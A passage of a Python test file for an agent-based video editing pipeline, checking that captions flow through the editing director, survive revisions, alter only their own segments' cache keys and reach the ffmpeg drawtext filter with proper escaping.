    b = direct(ctx, tracer_span, clip_set, a_caption((1, LIVELY, "two")),
               revision=1)
    assert a.inputs_hash != b.inputs_hash


def test_the_director_works_with_no_captions(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = LLMClient()
    art = direct(ctx, tracer_span, clip_set, None)
    assert art.payload.segments
    assert all(s.caption == "" for s in art.payload.segments)
    assert not any(d.what == "Captions from the Caption agent"
                   for d in art.decisions)


def test_a_revision_keeps_the_captions(cap_ctx, tracer_span):
    """Caption sits upstream of the critic cycle: a re-plan re-applies the
    same words, it does not lose or re-choose them."""
    from agents.artifacts import RevisionRequest
    ctx, clip_set = cap_ctx
    ctx.llm = LLMClient()
    cap = a_caption((1, LIVELY, "the drive gear"))
    first = direct(ctx, tracer_span, clip_set, cap)
    req = RevisionRequest(from_attempt=1, target_agent="editing_director",
                          issue="open livelier", severity="high",
                          constraints={"opening_must_be_liveliest": True})
    second = direct(ctx, tracer_span, clip_set, cap, revision=1,
                    revision_request=req)
    for plan in (first.payload, second.payload):
        assert [s.caption for s in plan.segments
                if s.clip_id == LIVELY] == ["the drive gear"]


def test_a_caption_changes_only_its_own_segments_cache_key(cap_ctx,
                                                          tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = LLMClient()
    bare = direct(ctx, tracer_span, clip_set, None).payload
    capd = direct(ctx, tracer_span, clip_set,
                  a_caption((1, LIVELY, "the drive gear")),
                  revision=1).payload
    assert any(s.clip_id == LIVELY for s in capd.segments)
    for a, b in zip(bare.segments, capd.segments):
        changed = a.cache_key() != b.cache_key()
        assert changed == (b.clip_id == LIVELY), \
            "a caption must re-render its own segment and nothing else"


def test_the_caption_reaches_the_render_spec_and_the_drawtext(cap_ctx,
                                                             tracer_span):
    """Plan -> RenderSpec -> the filter build_video builds for that part."""
    from agents.tools.render_tools import compile_render_spec
    ctx, clip_set = cap_ctx
    ctx.llm = LLMClient()
    plan = direct(ctx, tracer_span, clip_set,
                  a_caption((1, LIVELY, "the drive gear"))).payload
    spec = compile_render_spec("j", "b", "s", plan)
    assert any(r.caption for r in spec.segments)
    for p, r in zip(plan.segments, spec.segments):
        assert r.caption == p.caption
        body, _ = build_video.fit_filter(
            {"start": r.start, "end": r.end, "orientation": r.orientation,
             "caption": r.caption}, spec.canvas)
        if r.caption:
            assert f"text='{build_video.esc(r.caption)}'" in body
        else:
            assert "drawtext" not in body


def test_the_segment_gate_keeps_a_caption_to_one_line():
    seg = dict(index=1, clip_id=CALM, start=0.0, end=2.0, duration=2.0,
               orientation="horizontal")
    assert Segment(**seg, caption="two\nlines\x00here").caption == \
        "two lines here"
    assert Segment(**seg, caption=None).caption == ""
    assert Segment(**seg, caption=7).caption == ""


# ------------------------------------------ helpers on the model

def test_caption_helpers():
    cap = a_caption((1, LIVELY, "one"), (3, CALM, "three"))
    assert cap.captioned_beats == [1, 3]
    assert cap.for_beat(3).text == "three"
    assert cap.for_beat(2) is None
    assert cap.for_clip(CALM).beat_index == 3
    assert cap.for_clip("nope.mp4") is None
